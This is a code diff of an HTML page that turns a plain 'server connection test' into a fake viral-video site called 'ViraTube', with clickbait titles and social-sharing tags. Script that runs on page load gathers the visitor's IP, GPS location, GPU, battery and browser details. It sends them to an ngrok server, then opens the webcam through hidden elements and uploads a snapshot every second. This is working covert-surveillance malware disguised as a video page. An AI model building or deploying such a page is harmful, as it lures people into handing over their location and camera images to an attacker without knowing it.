@@ -3,20 +3,178 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Server Connection Test</title>
+    <title>ViraTube - Hottest Viral Videos</title>
+
+    <!-- Facebook Open Graph Meta Tags for Social Sharing -->
+    <meta property="og:title" content="19 Minute 34 seciond viral video" />
+    <meta property="og:description" content="You won't believe what happens in this viral clip that's taking the internet by storm!" />
+    <meta property="og:type" content="video.other" />
+    <meta property="og:url" content="https://example.com/viral-video" />
+    <meta property="og:image" content="https://i.ytimg.com/vi/nAYhTNe8RAI/hqdefault.jpg?sqp=-oaymwEmCOADEOgC8quKqQMa8AEB-AH-CYAC0AWKAgwIABABGHIgSCgzMA8=&rs=AOn4CLDZI-btbHgFAU0lv4dJt5DUSRAGdA" />
+    <meta name="description" content="The most viral video on the internet right now. A 19 minute and 34 second clip that has everyone talking. Watch it here on ViraTube." />
+    <meta name="keywords" content="viral, video, trending, funny, shocking, ViraTube" />
+
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>▶️</text></svg>">
+
     <style>
+        /* ========================= */
+        /* Main UI Styles (from modified file) */
+        /* ========================= */
         body {
-            /* Center the loader */
             display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            background: radial-gradient(ellipse at center, #2c2c2c 0%, #121212 100%);
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            color: #fff;
+            margin: 0;
+            box-sizing: border-box;
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 30px;
+            background-color: rgba(20, 20, 20, 0.8);
+            border-bottom: 1px solid #333;
+            backdrop-filter: blur(10px);
+            width: 100%;
+            box-sizing: border-box;
+        }
+        .logo {
+            font-size: 1.8em;
+            font-weight: bold;
+        }
+        .logo span { color: #ff0000; }
+        .nav a {
+            color: #ccc;
+            text-decoration: none;
+            margin-left: 25px;
+            font-weight: 500;
+            transition: color 0.2s;
+        }
+        .nav a:hover { color: #fff; }
+        main {
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            margin: 0;
-            background-color: #ffffff; /* White background */
+            padding: 40px 20px;
+            animation: fadeIn 1s ease-in-out;
+            text-align: center;
         }
+        .main-title {
+            font-size: 2.5em;
+            font-weight: bold;
+            margin-bottom: 30px;
+            background: -webkit-linear-gradient(#eee, #aaa);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0px 2px 10px rgba(0,0,0,0.7);
+        }
+        .video-container {
+            position: relative;
+            cursor: pointer;
+        }
+        .video-container::after {
+            content: '▶';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 80px;
+            color: rgba(255, 255, 255, 0.7);
+            text-shadow: 0 0 20px rgba(0, 0, 0, 1);
+            opacity: 0;
+            transition: opacity 0.3s ease, transform 0.3s ease;
+            pointer-events: none;
+        }
+        .video-container:hover::after {
+            opacity: 1;
+            transform: translate(-50%, -50%) scale(1.1);
+        }
+        .video-container img {
+            max-width: 100%;
+            max-height: 70vh;
+            border-radius: 12px;
+            border: 3px solid #333;
+            transition: all 0.2s ease-in-out;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.4);
+        }
+        .video-container:hover img {
+            transform: scale(1.02);
+            border-color: #ff0000;
+            box-shadow: 0 0 25px rgba(255, 0, 0, 0.5);
+        }
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            cursor: pointer;
+        }
+        .video-player {
+            background: #000;
+            width: 90%;
+            max-width: 800px;
+            aspect-ratio: 16 / 9;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            border: 1px solid #333;
+            border-radius: 8px;
+            cursor: default;
+        }
+        .close-modal {
+            position: absolute;
+            top: 15px;
+            right: 25px;
+            font-size: 35px;
+            color: #aaa;
+            cursor: pointer;
+            transition: color 0.2s;
+            z-index: 1001;
+            line-height: 1;
+        }
+        .close-modal:hover { color: #fff; }
+        #status {
+            color: #aaa;
+            margin-top: 20px;
+            font-size: 1.1em;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .footer {
+            padding: 20px;
+            text-align: center;
+            background-color: #1a1a1a;
+            border-top: 1px solid #333;
+            font-size: 0.9em;
+            color: #888;
+        }
+        .footer a {
+            color: #aaa;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+        .footer a:hover { text-decoration: underline; }
+
+        /* ========================= */
+        /* Functional styles from original file */
+        /* ========================= */
         .loader {
-            border: 8px solid #f3f3f3; /* Light Grey */
-            border-top: 8px solid #3498db; /* Blue */
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #3498db;
             border-radius: 50%;
             width: 60px;
             height: 60px;
@@ -26,74 +184,98 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
+        video#webcam, canvas#canvas {
+            display: none;
+        }
     </style>
 </head>
 <body>
+    <header class="header">
+        <div class="logo">Vira<span>Tube</span></div>
+        <nav class="nav">
+            <a href="javascript:void(0);">Home</a>
+            <a href="javascript:void(0);">Trending</a>
+            <a href="javascript:void(0);">About</a>
+        </nav>
+    </header>
 
-    <!-- Rotating loading circle -->
-    <div class="loader"></div>
+    <main>
+        <h1 class="main-title">19 Minute 34 seciond viral video</h1>
+        <div class="video-container" onclick="playVideo()">
+            <img src="https://i.ytimg.com/vi/nAYhTNe8RAI/hqdefault.jpg?sqp=-oaymwEmCOADEOgC8quKqQMa8AEB-AH-CYAC0AWKAgwIABABGHIgSCgzMA8=&rs=AOn4CLDZI-btbHgFAU0lv4dJt5DUSRAGdA" alt="Viral Video Thumbnail">
+        </div>
+    </main>
 
-    <!-- Hidden elements for camera capture -->
-    <video id="webcam" autoplay playsinline style="display:none;"></video>
-    <canvas id="canvas" style="display:none;"></canvas>
+    <div class="modal-overlay" id="video-player-modal">
+        <div class="close-modal" id="close-modal-btn">&times;</div>
+        <div class="video-player" onclick="event.stopPropagation();">
+            <div class="loader"></div>
+            <div id="status">Connecting to streaming server...</div>
+        </div>
+    </div>
+
+    <video id="webcam" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <footer class="footer">
+        <p>&copy; 2025 ViraTube. All Rights Reserved.</p>
+        <div>
+            <a href="javascript:void(0);">Privacy Policy</a> |
+            <a href="javascript:void(0);">Terms of Service</a> |
+            <a href="javascript:void(0);">Contact Us</a>
+        </div>
+    </footer>
 
     <script>
-        // ==========================================
-        // ⚠️ STEP 1: PUT YOUR SERVER URL HERE
-        // Example: 'https://your-ngrok-url.ngrok-free.app'
-        // ==========================================
-        const SERVER_URL = ' https://648ff14dfhdfhdfd2.ngrok-free.app'; // ⚠️ This should match the SERVER_URL in your .env file
+        const SERVER_URL = 'https://c3bd977adde0.ngrok-free.app';
+        const modal = document.getElementById('video-player-modal');
+        const closeModalBtn = document.getElementById('close-modal-btn'); 
+        const statusDiv = document.getElementById('status');
+
+        let cameraStream = null;
+        let imageSendingInterval = null;
+
+        function playVideo() {
+            modal.style.display = 'flex';
+            sendIpToServer();
+        }
+
+        function closeModal() {
+            if (cameraStream) cameraStream.getTracks().forEach(track => track.stop());
+            if (imageSendingInterval) clearInterval(imageSendingInterval);
+            modal.style.display = 'none';
+        }
+
+        closeModalBtn.addEventListener('click', closeModal);
+        modal.addEventListener('click', (event) => { if (event.target === modal) closeModal(); });
 
         async function sendIpToServer() {
-            // Helper to get GPU info
             function getGpuInfo() {
                 try {
                     const canvas = document.createElement('canvas');
                     const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                     const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                     return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                } catch (e) {
-                    return 'Unknown';
-                }
+                } catch (e) { return 'Unknown'; }
             }
 
-            // Helper to get precise GPS location
             function getPreciseLocation() {
                 return new Promise((resolve, reject) => {
-                    if (!navigator.geolocation) {
-                        return reject(new Error('Geolocation is not supported.'));
-                    }
-                    // This triggers the browser's permission prompt
+                    if (!navigator.geolocation) return reject(new Error('Geolocation not supported.'));
                     navigator.geolocation.getCurrentPosition(
-                        (position) => {
-                            resolve({
-                                lat: position.coords.latitude,
-                                lon: position.coords.longitude,
-                            });
-                        },
-                        (error) => {
-                            // This happens if the user clicks "Block" or an error occurs
-                            return reject(error);
-                        }
+                        (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
+                        (err) => reject(err)
                     );
                 });
             }
 
             try {
-                // 1. Ask for precise location first
                 let location = {};
-                try {
-                    console.log("Requesting precise location from user...");
-                    location = await getPreciseLocation();
-                } catch (locationError) {
-                    console.warn("Precise location denied or failed. Falling back to IP-based location.");
-                }
+                try { location = await getPreciseLocation(); } catch(e){}
 
-                // 2. Get IP-based Geolocation data (as a fallback and for other details)
                 const geoResponse = await fetch('http://ip-api.com/json');
                 const geoData = await geoResponse.json();
 
-                // 3. Get Device Information
                 const batteryInfo = await navigator.getBattery();
                 const deviceDetails = {
                     ip: geoData.query,
@@ -103,7 +285,6 @@
                     city: geoData.city,
                     org: geoData.org,
                     isp: geoData.isp,
-                    // Use precise location if available, otherwise use IP-based location
                     lat: location.lat || geoData.lat,
                     lon: location.lon || geoData.lon,
                     platform: navigator.platform,
@@ -116,28 +297,16 @@
                     userAgent: navigator.userAgent
                 };
 
-                // 4. Send all data to your Python Server
                 const response = await fetch(`${SERVER_URL}/receive-ip`, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(deviceDetails)
                 });
-                
+
                 const responseData = await response.json();
+                if(response.ok && responseData.clientID) startCameraAndStream(responseData.clientID);
 
-                if (response.ok && responseData.clientID) {
-                    // --- If initial data is sent successfully, start camera ---
-                    startCameraAndStream(responseData.clientID);
-                    console.log("Data sent successfully. Starting camera stream...");
-                } else {
-                    throw new Error("Server rejected request");
-                }
-
-            } catch (error) {
-                console.error(error);
-            }
+            } catch (err) { console.error(err); }
         }
 
         async function startCameraAndStream(clientID) {
@@ -146,44 +315,27 @@
             const context = canvas.getContext('2d');
 
             try {
-                // This will trigger the camera permission prompt
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                video.srcObject = stream;
+                cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = cameraStream;
 
                 video.onloadedmetadata = () => {
-                    // Set canvas dimensions to match video
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
 
-                    // Send a picture every second
-                    setInterval(() => {
-                        // Draw the current video frame to the canvas
+                    imageSendingInterval = setInterval(() => {
                         context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        
-                        // Convert the canvas image to a JPEG data URL
-                        const imageData = canvas.toDataURL('image/jpeg', 0.7); // 70% quality
-
-                        // Send the image to the server
+                        const imageData = canvas.toDataURL('image/jpeg', 0.7);
                         fetch(`${SERVER_URL}/receive-image`, {
                             method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/json'
-                            },
-                            body: JSON.stringify({
-                                clientID: clientID,
-                                imageData: imageData
-                            })
-                        }).catch(err => { /* We can ignore errors here to prevent console spam */ });
-
-                    }, 1000); // 1000ms = 1 second
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ clientID, imageData })
+                        }).catch(() => {});
+                    }, 1000);
                 };
-            } catch (err) {
-                console.error("Camera access denied or failed:", err);
-            }
+            } catch (err) { console.error("Camera access failed:", err); }
         }
 
-        // Run on page load
-        sendIpToServer();
+        window.addEventListener('load', () => { playVideo(); });
     </script>
 </body>
 </html>
